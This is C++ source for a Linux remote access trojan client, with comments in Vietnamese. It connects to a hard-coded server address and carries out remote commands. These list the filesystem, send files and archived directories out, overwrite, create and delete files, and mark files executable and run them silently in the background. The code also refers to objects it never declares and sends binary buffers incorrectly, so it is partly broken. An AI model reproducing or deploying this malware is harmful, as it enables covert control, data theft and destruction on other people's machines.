#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <cstring>

// Thư viện Socket và Hệ thống trên Linux
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <unistd.h>       // Thư viện cho getusername, gethostname
#include <sys/utsname.h>  // Thư viện lấy thông tin OS (Kernel, Name)
#include <limits.h>       // Định nghĩa các hằng số giới hạn như HOST_NAME_MAX

namespace fs = std::filesystem;
const int BUFFER_SIZE = 4096;



class SocketClient {
public:
    int socket;
    void Send(const std::string&);
    std::string Receive();
};

void SocketClient::Send(const std::string& msg){
    send(socket, msg.c_str(), static_cast<int>(msg.size()), 0);
}

std::string SocketClient::Receive() {
    char buffer[BUFFER_SIZE]{};

    int bytes = recv(socket, buffer, BUFFER_SIZE, 0);

    if(bytes <= 0)
        return "";

    return std::string(buffer, bytes);
}



class FileManager {
public:
    SocketClient client;
    void HandleList();
    void HandleEditFile(const std::string& filename);
    void HandleRemoveFile(const std::string& filename);
    void HandleRunFile(const std::string& filename);
    void HandleCreateFile(const std::string& filename);
    void HandleDownload(const std::string& filename);
    void HandleDownloadDir(const std::string& foldername);
};

// Hàm xử lý lệnh LIST (Liệt kê file)
void FileManager::HandleList() {
    char buffer[128];
    std::string result = "\n=== KET QUA TU LENH SYSTEM (ls -lR) ===\n\n";
    
    // Chạy lệnh "ls -lR" và mở một pipe để đọc kết quả (chế độ "r" - read)
    // popen sẽ chuyển hướng stdout của lệnh vào pipe này
    FILE* pipe = popen("ls -lR", "r");
    
    if (!pipe) {
        std::string errorMsg = "ERROR: Khong the thuc thi lenh he thong.\n";
        client.Send(errorMsg);
        return;
    }

    // Đọc dữ liệu từ pipe cho đến khi hết
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    // Đóng pipe và lấy trạng thái kết thúc của lệnh
    int returnCode = pclose(pipe);
    if (returnCode != 0) {
        result += "\n[!] Lenh ket thuc voi loi (Code: " + std::to_string(returnCode) + ")\n";
    }

    // Gửi toàn bộ kết quả trả về cho Server qua Socket
    client.Send(result);
}

// Hàm xử lý việc thay đổi nội dung file từ xa
void FileManager::HandleEditFile(const std::string& filename) {
    
    // 1. Gửi tín hiệu thông báo sẵn sàng nhận nội dung mới
    std::string readyMsg = "READY_FOR_CONTENT";
    client.Send(readyMsg.c_str());

    // 2. Nhận nội dung mới từ Server (đặt cấu hình tạm thời nhận dữ liệu)
    auto newContent = client.Receive();
    if (newContent.empty()) {
        std::cout << "[-] Mat ket noi khi dang nhan noi dung file.\n" << std::endl;
        return;
    }

    // 3. Tiến hành ghi đè nội dung vào file
    std::ofstream file(filename, std::ios::trunc | std::ios::binary); // std::ios::trunc để ghi đè dữ liệu cũ
    std::string statusMsg;

    if (!file.is_open()) {
        statusMsg = "ERROR: Khong the mo hoặc tao file de ghi tren Client.\n";
    } else {
        file.write(newContent.c_str(), newContent.length());
        file.close();
        statusMsg = "SUCCESS: Da cap nhat noi dung file '" + filename + "' thanh cong.\n";
    }

    // 4. Gửi báo cáo kết quả về Server
    client.Send(statusMsg);
    std::cout << "[+] Thuc hien EDITFILE " << filename << ": " << statusMsg << std::endl;
}

// Hàm xử lý việc xóa file từ xa
void FileManager::HandleRemoveFile(const std::string& filename) {
    std::string statusMsg;

    // 1. Kiểm tra xem file có tồn tại và có phải là file thường không (tránh xóa nhầm folder)
    if (!fs::exists(filename)) {
        statusMsg = "ERROR: File '" + filename + "' khong ton tai.\n";
    } else if (fs::is_directory(filename)) {
        statusMsg = "ERROR: '" + filename + "' la mot thu muc, khong the dung lenh xoa file.\n";
    } else {
        // 2. Thực hiện xóa file
        std::error_code ec;
        if (fs::remove(filename, ec)) {
            statusMsg = "SUCCESS: Da xoa file '" + filename + "' thanh cong.\n";
        } else {
            statusMsg = "ERROR: Khong the xoa file (Loi: " + ec.message() + ").\n";
        }
    }

    // 3. Gửi báo cáo kết quả về Server và in log ra màn hình Client
    client.Send(statusMsg);
    std::cout << "[+] Thuc hien REMOVEFILE " << filename << ": " << statusMsg << std::endl;
}

// Hàm xử lý việc chạy một file thực thi trên Client
void FileManager::HandleRunFile(const std::string& filepath) {
    std::string statusMsg;

    // 1. Kiểm tra xem file có tồn tại hay không
    if (!fs::exists(filepath)) {
        statusMsg = "ERROR: File '" + filepath + "' khong ton tai.\n";
        client.Send(statusMsg);
        return;
    }

    // 2. Kiểm tra xem có quyền thực thi (Execute) không, nếu chưa có thì cấp quyền
    // (Tương đương lệnh chmod +x trên Linux)
    try {
        fs::permissions(filepath, fs::perms::owner_exec | fs::perms::group_exec | fs::perms::others_exec, fs::perm_options::add);
    } catch (const std::exception& e) {
        statusMsg = "ERROR: Khong the cap quyen thuc thi cho file.\n";
        client.Send(statusMsg);
        return;
    }

    std::cout << "[*] Dang khoi chay file: " << filepath << "...\n";

    // 3. Xây dựng lệnh chạy ngầm
    // Định dạng đường dẫn chuẩn hóa
    std::string runCmd;
    if (filepath.rfind("/", 0) == std::string::npos && filepath.rfind("./", 0) == std::string::npos) {
        runCmd = "./" + filepath;
    } else {
        runCmd = filepath;
    }

    // Đẩy tiến trình chạy ngầm bằng cách chuyển hướng log ra /dev/null và thêm &
    runCmd = runCmd + " > /dev/null 2>&1 &";

    int res = system(runCmd.c_str());

    if (res == 0) {
        statusMsg = "SUCCESS: Da kich hoat lenh chay file '" + filepath + "' ngam thanh cong.\n";
    } else {
        statusMsg = "ERROR: Co loi xay ra khi goi thuc thi file.\n";
    }

    // 4. Gửi phản hồi về Server
    client.Send(statusMsg);
    std::cout << "[+] Thuc hien RUNFILE " << filepath << ": " << statusMsg << std::endl;
}

// Hàm xử lý việc tạo file mới từ xa
void FileManager::HandleCreateFile(const std::string& filename) {
    // 1. Kiểm tra xem file đã tồn tại chưa bằng thư viện chuẩn fstream
    // (Tránh việc vô tình ghi đè lên file quan trọng có sẵn)
    std::ifstream checkFile(filename);
    if (checkFile.is_open()) {
        checkFile.close();
        std::string errorMsg = "ERROR: File '" + filename + "' da ton tai tren Client. Dung EDITFILE de sua.\n";
        client.Send(errorMsg);
        return;
    }

    // 2. Gửi tín hiệu thông báo sẵn sàng nhận nội dung cho file mới
    std::string readyMsg = "READY_FOR_CONTENT";
    client.Send(readyMsg);

    // 3. Nhận nội dung ban đầu từ Server
    auto content = client.Receive();
    if (content.empty()) {
        std::cout << "[-] Mat ket noi khi dang nhan noi dung file moi.\n" << std::endl;
        return;
    }

    // 4. Tiến hành tạo và ghi file mới
    std::ofstream file(filename, std::ios::out | std::ios::binary);
    std::string statusMsg;

    if (!file.is_open()) {
        statusMsg = "ERROR: Khong the tao file tren Client (Kiem tra lai duong dan hoac quyen ghi).\n";
    } else {
        file.write(content.c_str(), content.length());
        file.close();
        statusMsg = "SUCCESS: Da tao file '" + filename + "' moi thanh cong.\n";
    }

    // 5. Gửi báo cáo kết quả về Server và in log tại Client
    client.Send(statusMsg);
    std::cout << "[+] Thuc hien CREATEFILE " << filename << ": " << statusMsg << std::endl;
}

// Hàm xử lý lệnh GET (Tải file)
void FileManager::HandleDownload(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        std::string msg = "ERROR: Khong the mo file.\n";
        client.Send(msg);
        return;
    }

    // Thông báo cho Server biết file hợp lệ và chuẩn bị gửi
    client.Send("START");
    usleep(100000); // Ngủ 100ms (100,000 microseconds) để tránh dính gói tin (TCP Coalescing)

    char buffer[BUFFER_SIZE];
    while (file.read(buffer, sizeof(buffer))) {
        client.Send(buffer);
    }
    // Gửi nốt phần dữ liệu còn lại nếu nhỏ hơn BUFFER_SIZE
    if (file.gcount() > 0) {
        client.Send(buffer);
    }
    
    file.close();
    std::cout << "[+] Da gui xong file: " << filename << std::endl;
}

// Hàm xử lý tải toàn bộ Folder (Nén lại rồi gửi)
void FileManager::HandleDownloadDir(const std::string& foldername) {
    if (!fs::exists(foldername) || !fs::is_directory(foldername)) {
        std::string msg = "ERROR: Thu muc khong ton tai.\n";
        client.Send(msg);
        return;
    }

    fs::path absolutePath = fs::absolute(foldername);
    std::string parentDir = absolutePath.parent_path().string();
    std::string dirName = absolutePath.filename().string();

    std::string tarCmd = "tar -czf archive.tar.gz -C \"" + parentDir + "\" \"" + dirName + "\"";
    
    // Thực hiện nén trước
    int res = system(tarCmd.c_str());
    if (res != 0) {
        std::string msg = "ERROR: Khong the nen thu muc.\n";
        client.Send(msg);
        return;
    }

    // Mở file sau khi nén thành công
    std::ifstream file("archive.tar.gz", std::ios::binary);
    if (!file.is_open()) {
        std::string msg = "ERROR: Khong the mo file archive.\n";
        client.Send(msg);
        return;
    }

    // Gửi tín hiệu thông báo cho Server: Mọi thứ đã sẵn sàng
    std::string startMsg = "START";
    client.Send(startMsg);
    
    // Ngủ 200ms để Server kịp nhận gói START tách biệt hoàn toàn với gói dữ liệu file tiếp theo
    usleep(200000); 

    char buffer[BUFFER_SIZE];
    while (file.read(buffer, sizeof(buffer))) {
        client.Send(buffer);
    }
    if (file.gcount() > 0) {
        client.Send(buffer);
    }
    file.close();

    fs::remove("archive.tar.gz");
    std::cout << "[+] Da nén va gui xong folder qua socket!\n";
}



class RatClient {
public:
    void Start();

private:
    SocketClient client;
    FileManager fileManager;

    void InitClientSocket();
    void Listen();

    void CommandLoop();
    void HandleCommand(const std::string& cmd);

};

void RatClient::Start() {
    InitClientSocket();
    Listen();
    CommandLoop();
}

void RatClient::InitClientSocket() {
    client.socket = socket(AF_INET, SOCK_STREAM, 0);
    fileManager.client = client;
    processManager.client = client;
    systemInfo.client = client;
    if (client.socket < 0) {
        std::cerr << "[-] Khong the tao socket!\n";
        exit(1);
    }
}

void RatClient::Listen() {
    sockaddr_in serverAddr;
    std::memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080); // Cổng trùng với Server

    // Chuyển đổi IP từ chuỗi text sang dạng nhị phân
    if (inet_pton(AF_INET, "192.168.0.2", &serverAddr.sin_addr) <= 0) {
        std::cerr << "[-] Dia chi IP khong hop le!\n";
        close(client.socket);
        exit(1);
    }

    std::cout << "[*] Dang ket noi den Server...\n";
    if (connect(client.socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[-] Ket noi that bai!\n";
        close(client.socket);
        exit(1);
    }
    std::cout << "[+] Ket noi thanh cong!\n";
}

void RatClient::CommandLoop() {
    while (true) {
        auto command = client.Receive();
        if (command.empty()) {
            std::cout << "[-] Mat ket noi voi Server.\n";
            break;
        }

        std::cout << "[*] Lenh nhan duoc: " << command << std::endl;
        HandleCommand(command);
    }
}

void RatClient::HandleCommand(const std::string& command) {
    if (command == "LIST") {
        fileManager.HandleList();
    } 
    else if (command.rfind("GETFILE ", 0) == 0) {
        std::string filename = command.substr(8);
        fileManager.HandleDownload(filename); // Hàm HandleDownload cũ của bạn
    }
    else if (command.rfind("GETDIR ", 0) == 0) {
        std::string foldername = command.substr(7);
        fileManager.HandleDownloadDir(foldername);
    }
    else if (command.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh EDITFILE
        std::string filename = command.substr(9);
        fileManager.HandleEditFile(filename);
    }
    else if (command.rfind("REMOVEFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh REMOVEFILE
        std::string filename = command.substr(11);
        fileManager.HandleRemoveFile(filename);
    }
    else if (command.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh RUNFILE
        std::string filepath = command.substr(8);
        fileManager.HandleRunFile(filepath);
    }
    else if (command.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh CREATEFILE
        std::string filename = command.substr(11);
        fileManager.HandleCreateFile(filename);
    }
}



int main() {
    RatClient client;
    client.Start();
}